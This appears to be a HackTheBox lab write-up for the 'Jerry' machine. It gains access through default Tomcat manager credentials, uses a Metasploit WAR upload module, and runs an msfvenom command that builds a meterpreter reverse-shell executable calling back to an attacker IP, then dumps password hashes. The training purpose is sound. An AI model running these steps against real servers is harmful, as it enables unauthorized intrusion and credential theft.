# **Description**

Hello hackers, I hope you are doing well. We are doing [Jerry](https://app.hackthebox.com/machines/Jerry) from [HackTheBox](https://www.hackthebox.com). It's running Apache Tomcat with default credentials, allowing us to upload files and get access to the machine.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.95
Host is up (0.11s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
```

We found an Apache webserver running on port 8080.

## Web

Let's see what's on the webserver.

![](1.png)

It's Tomcat welcome page. Going to **/manager** page we get prompt for a username and a password, trying random credentials we get Access Denied page that reveals the default credentials.

# **Foothold**

To get initial access to the target, we can use the metasploit module **exploit/multi/http/tomcat_mgr_upload** that would upload a **.war** to the server, start a listener and then execute the file to get a reverse shell. 

![](3.png)

We need to set the required options.

```
set rhosts {target_IP}

set rport 8080

set httpusername tomcat

set httppassword s3cret

set lhost tun0
```

And we run the exploit by typing `exploit`.

We got in to the target as user `Jerry`.

# **Shell upgrade**

User Jerry is an Administrator in this machine so no need for privilege escalation, But meterpreter commands like hashdump won't work.

![](5.png)

Let's generate a exe reverse shell file to be executed on the target with `msfvenom`

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f exe -o shell.exe
```

>Change LHOST value to your tun0 IP.


Now we need to upload it to the target using the upload feature in meterpreter.

Next is to setup a multi handler listener on metasploit, first, background the current session with the command `background`.

Next is to use a the multi handler with correct options set and run in in the background with the command `run -j`.

![](6.png)

Now go back to the first session with the command `sessions 1`, run the command `shell` to get a cmd shell, go to where you uploaded the shell.exe file and run it.

![](7.png)

We see that another session got opened.

Now exit the current shell, then background the meterpreter session, and run `sessions 2` to move to the newly opened session.

We can dump the hashes now without any problems.
